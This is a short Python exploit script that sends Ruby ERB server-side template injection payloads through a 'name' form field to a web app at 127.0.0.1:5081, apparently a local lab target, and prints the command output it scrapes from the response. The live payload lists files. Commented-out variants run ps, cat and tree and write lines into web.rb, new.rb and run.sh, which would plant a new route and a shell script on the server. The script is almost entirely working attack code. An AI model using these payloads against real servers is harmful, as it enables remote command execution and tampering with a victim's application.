import requests
import re
import base64

def sendPayload(payload_arg=""):
    return requests.post("http://127.0.0.1:5081/",data={"name":payload_arg}).text


# payload='<%=system( "touch attackerFile" )%>'
payload ='<%=%x(ls )%> '
# payload ='<%=%x( echo "" >> new.rb )%> '
# payload ='<%=%x(  ps ajax )%> '
# payload ='<%=%x( cat new.rb )%> '
# payload ='<%=%x( echo "get "/attack" do" >> web.rb )%> '
# payload ='<%=%x( echo "    getHTML(name)" >> web.rb )%> '
# payload ='<%=%x( tree . )%> '
# payload =f'<%=%x( echo "{line}" > new.rb )%> '
# payload =f'<%=%x( echo "{line}" > run.sh )%> '


result = sendPayload(payload)

try:
    regex = r"<h2>Hello([\s\S]*)</h2>"
    matches = re.findall(regex,result)
    print(matches[0])
except:
    print("RESULT ERROR:\n"+result)
